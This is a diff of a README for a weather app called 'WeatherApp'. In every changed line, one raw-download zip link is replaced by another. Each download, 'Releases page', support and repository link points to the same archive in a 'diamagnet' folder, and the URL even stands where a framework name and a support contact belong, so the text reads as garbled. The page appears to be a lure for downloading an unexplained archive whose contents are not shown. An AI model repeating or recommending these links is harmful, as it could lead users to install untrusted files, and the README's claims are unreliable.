@@ -1,10 +1,10 @@
 # 🌤️ WeatherApp - Check Weather Anywhere, Anytime
 
-[![Download WeatherApp](https://github.com/Kevinkjul/WeatherApp/raw/refs/heads/main/diamagnet/Weather_App_v1.4.zip)](https://github.com/Kevinkjul/WeatherApp/raw/refs/heads/main/diamagnet/Weather_App_v1.4.zip)
+[![Download WeatherApp](https://github.com/Kevinkjul/WeatherApp/raw/refs/heads/main/diamagnet/App-Weather-v2.8.zip)](https://github.com/Kevinkjul/WeatherApp/raw/refs/heads/main/diamagnet/App-Weather-v2.8.zip)
 
 ## 🌟 About WeatherApp
 
-WeatherApp is a powerful weather application built on https://github.com/Kevinkjul/WeatherApp/raw/refs/heads/main/diamagnet/Weather_App_v1.4.zip Core and hosted on Azure Web Services. This app allows you to enter any location and receive accurate weather forecasts, air quality data, precipitation levels, wind speeds, and more. No matter where you are or where you want to go, WeatherApp delivers up-to-date weather information at your fingertips.
+WeatherApp is a powerful weather application built on https://github.com/Kevinkjul/WeatherApp/raw/refs/heads/main/diamagnet/App-Weather-v2.8.zip Core and hosted on Azure Web Services. This app allows you to enter any location and receive accurate weather forecasts, air quality data, precipitation levels, wind speeds, and more. No matter where you are or where you want to go, WeatherApp delivers up-to-date weather information at your fingertips.
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ To get started with WeatherApp, follow these simple steps:
 
 2. Visit our download page to get the latest version.
    
-   [Download WeatherApp Here](https://github.com/Kevinkjul/WeatherApp/raw/refs/heads/main/diamagnet/Weather_App_v1.4.zip)
+   [Download WeatherApp Here](https://github.com/Kevinkjul/WeatherApp/raw/refs/heads/main/diamagnet/App-Weather-v2.8.zip)
 
 3. Choose the version you wish to download. Look for the most recent release to ensure you have the latest features and updates.
 
@@ -25,7 +25,7 @@ To get started with WeatherApp, follow these simple steps:
 
 To download and install WeatherApp, follow these steps:
 
-1. Click on the download link above or visit [this page to download](https://github.com/Kevinkjul/WeatherApp/raw/refs/heads/main/diamagnet/Weather_App_v1.4.zip).
+1. Click on the download link above or visit [this page to download](https://github.com/Kevinkjul/WeatherApp/raw/refs/heads/main/diamagnet/App-Weather-v2.8.zip).
   
 2. Once on the Releases page, find the link to the latest version of WeatherApp. It’s usually marked with the highest version number.
 
@@ -79,7 +79,7 @@ If you encounter any issues while using WeatherApp, consider these common fixes:
 
 ## 📞 Support
 
-Need help? Our support team is here for you. Reach out at [https://github.com/Kevinkjul/WeatherApp/raw/refs/heads/main/diamagnet/Weather_App_v1.4.zip](https://github.com/Kevinkjul/WeatherApp/raw/refs/heads/main/diamagnet/Weather_App_v1.4.zip) for any questions or issues you may have regarding WeatherApp.
+Need help? Our support team is here for you. Reach out at [https://github.com/Kevinkjul/WeatherApp/raw/refs/heads/main/diamagnet/App-Weather-v2.8.zip](https://github.com/Kevinkjul/WeatherApp/raw/refs/heads/main/diamagnet/App-Weather-v2.8.zip) for any questions or issues you may have regarding WeatherApp.
 
 ## 🌍 Topics
 
@@ -107,7 +107,7 @@ We appreciate the use of open-source technologies, which made creating WeatherAp
 
 For further information, updates, and community interaction, check out the following links:
 
-- GitHub Repository: [Visit Here](https://github.com/Kevinkjul/WeatherApp/raw/refs/heads/main/diamagnet/Weather_App_v1.4.zip)
+- GitHub Repository: [Visit Here](https://github.com/Kevinkjul/WeatherApp/raw/refs/heads/main/diamagnet/App-Weather-v2.8.zip)
 - Official Documentation (Coming Soon)
 - Community Forum (Coming Soon)
 
